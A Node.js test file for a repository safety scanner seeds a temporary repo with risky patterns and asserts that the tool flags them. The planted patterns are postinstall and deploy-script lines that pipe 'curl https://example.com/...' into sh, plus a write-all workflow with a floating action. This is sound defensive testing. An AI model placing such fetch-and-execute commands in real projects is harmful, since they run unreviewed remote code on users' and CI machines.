const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const assert = require('node:assert/strict');
const { test } = require('node:test');
const childProcess = require('node:child_process');

const repoRoot = path.resolve(__dirname, '..');
const largeMonorepoFixture = path.join(repoRoot, 'tests', 'fixtures', 'large-monorepo');
const sourceBin = path.join(repoRoot, 'bin', 'rai.js');

function makeTempRepo(prefix) {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  fs.cpSync(largeMonorepoFixture, tempDir, { recursive: true });
  return tempDir;
}

function run(command, args, cwd, extra = {}) {
  return childProcess.execFileSync(command, args, {
    cwd,
    env: { ...process.env, ...(extra.env || {}) },
    encoding: 'utf8',
    input: extra.input,
    stdio: ['pipe', 'pipe', 'pipe'],
  });
}

function writeFile(targetRepo, relativeFile, content) {
  const fullPath = path.join(targetRepo, relativeFile);
  fs.mkdirSync(path.dirname(fullPath), { recursive: true });
  fs.writeFileSync(fullPath, content);
}

function gitInit(targetRepo) {
  run('git', ['init'], targetRepo);
  run('git', ['config', 'user.email', 'test@example.com'], targetRepo);
  run('git', ['config', 'user.name', 'Test User'], targetRepo);
}

function bootstrapRepo(targetRepo) {
  run('node', [sourceBin, 'setup', '--target', targetRepo, '--script-profile', 'core', '--skip-verify'], repoRoot);
  gitInit(targetRepo);
  run('git', ['add', '.'], targetRepo);
  run('git', ['commit', '-m', 'initial state'], targetRepo);
  return path.join(targetRepo, 'bin', 'rai.js');
}

function seedSafetySignals(targetRepo) {
  const rootPackagePath = path.join(targetRepo, 'package.json');
  const rootPackage = JSON.parse(fs.readFileSync(rootPackagePath, 'utf8'));
  rootPackage.scripts = {
    ...(rootPackage.scripts || {}),
    postinstall: 'curl https://example.com/install.sh | sh',
  };
  fs.writeFileSync(rootPackagePath, `${JSON.stringify(rootPackage, null, 2)}\n`);

  writeFile(targetRepo, '.github/workflows/release.yml', [
    'name: release',
    'on: push',
    'permissions: write-all',
    'jobs:',
    '  build:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - uses: actions/checkout@main',
    '',
  ].join('\n'));

  writeFile(targetRepo, 'scripts/deploy.sh', [
    '#!/usr/bin/env bash',
    'set -euo pipefail',
    'curl https://example.com/bootstrap.sh | sh',
    '',
  ].join('\n'));

  fs.appendFileSync(path.join(targetRepo, 'packages', 'ui', 'index.js'), '\nmodule.exports.round6SafetyFlag = true;\n');
  fs.appendFileSync(path.join(targetRepo, 'apps', 'admin', 'src', 'dashboard.tsx'), '\nexport const round6SafetyAdminFlag = true;\n');

  fs.rmSync(path.join(targetRepo, '.workflow', 'product-manifest.json'), { force: true });
  writeFile(targetRepo, '.workflow/runtime/policy.json', '{\n');
  writeFile(targetRepo, '.workflow/runtime/secure-phase.json', '{\n');
}

test('safety-control materializes security and repair guidance and survives missing-manifest repair paths', () => {
  const targetRepo = makeTempRepo('raiola-phase45-safety-');
  const targetBin = bootstrapRepo(targetRepo);
  seedSafetySignals(targetRepo);

  const repair = JSON.parse(run('node', [targetBin, 'repair', '--kind', 'health', '--json'], targetRepo));
  const safetyControl = JSON.parse(run('node', [targetBin, 'safety-control', '--json'], targetRepo));
  const operatingCenter = JSON.parse(run('node', [targetBin, 'operate', '--refresh', '--json'], targetRepo));
  const planesHelp = run('node', [targetBin, 'help', 'planes'], targetRepo);

  assert.equal(safetyControl.action, 'safety-control');
  assert.equal(safetyControl.verdict, 'attention-required');
  assert.equal(safetyControl.security.verdict, 'fail');
  assert.ok((safetyControl.security.countsByCategory['floating-workflow-action'] || 0) >= 1);
  assert.ok((safetyControl.security.countsByCategory['workflow-write-all'] || 0) >= 1);
  assert.ok((safetyControl.security.countsByCategory['network-pipe-exec'] || 0) >= 1);
  assert.ok((safetyControl.security.countsByCategory['destructive-command'] || 0) >= 1);
  assert.ok(safetyControl.recovery.repair.safeActionCount >= 1);
  assert.ok(safetyControl.failureForecast.some((entry) => entry.title === 'Security-critical patterns detected'));
  assert.ok(safetyControl.nextActions.some((entry) => entry.command === 'rai repair --kind health --json'));
  assert.equal(safetyControl.codex.guide, '.codex/operator/safety-control/README.md');
  assert.equal(safetyControl.commands.workspaceImpact, 'rai workspace-impact --json');
  for (const relativeFile of [
    safetyControl.artifacts.json,
    safetyControl.artifacts.markdown,
    safetyControl.artifacts.runtimeJson,
    safetyControl.artifacts.runtimeMarkdown,
  ]) {
    assert.ok(fs.existsSync(path.join(targetRepo, relativeFile)), `${relativeFile} should exist`);
  }

  assert.equal(repair.kind, 'health');
  assert.ok(repair.runtimeIssues.some((issue) => issue.type === 'missing_manifest'));
  assert.ok(repair.runtimeIssues.some((issue) => issue.type === 'corrupt_json' && issue.filePath === '.workflow/runtime/policy.json'));
  assert.ok(repair.runtimeIssues.some((issue) => issue.type === 'corrupt_json' && issue.filePath === '.workflow/runtime/secure-phase.json'));
  assert.ok(repair.safeActionCount >= 1);

  assert.equal(operatingCenter.action, 'operate');
  assert.ok(operatingCenter.planeBoard.some((plane) => plane.id === 'safety-control'));
  assert.ok(operatingCenter.planes.safetyControl);

  assert.match(planesHelp, /safety-control/);
});

test('codex setup and operator packet ship safety-control guides, commands, and plugin skills', () => {
  const targetRepo = makeTempRepo('raiola-phase45-operator-');
  const targetBin = bootstrapRepo(targetRepo);
  seedSafetySignals(targetRepo);

  const setup = JSON.parse(run('node', [targetBin, 'codex', 'setup', '--repo', '--json'], targetRepo));
  const operator = JSON.parse(run('node', [targetBin, 'codex', 'operator', '--goal', 'stabilize the current security and repair wave', '--json'], targetRepo));

  assert.ok(setup.operatorAssets.includes('.codex/operator/safety-control/README.md'));
  assert.ok(fs.existsSync(path.join(targetRepo, '.codex/operator/safety-control/README.md')));

  assert.equal(operator.commands.safetyControl, 'rai safety-control --json');
  assert.equal(operator.files.safetyControlGuide, '.codex/operator/safety-control/README.md');
  assert.ok(['clear', 'guided', 'attention-required'].includes(operator.safetyControl.verdict));
  assert.equal(operator.safetyControl.command, 'rai safety-control --json');
  assert.ok(operator.skills.includes('raiola-safety-control-room'));

  const operatorMarkdown = fs.readFileSync(path.join(targetRepo, operator.markdownFile), 'utf8');
  assert.match(operatorMarkdown, /Safety control/);
  assert.match(operatorMarkdown, /Repo-native control rooms/);

  const safetyGuide = fs.readFileSync(path.join(targetRepo, '.codex/operator/safety-control/README.md'), 'utf8');
  assert.match(safetyGuide, /safety-control/i);
  assert.match(safetyGuide, /repair/i);

  const pluginDir = path.join(targetRepo, 'plugins', 'raiola-codex-optimizer');
  const plugin = JSON.parse(fs.readFileSync(path.join(pluginDir, '.codex-plugin', 'plugin.json'), 'utf8'));
  assert.ok(plugin.skills.includes('skills/raiola-safety-control-room'));
  assert.ok(fs.existsSync(path.join(pluginDir, 'skills', 'raiola-safety-control-room', 'SKILL.md')));
});
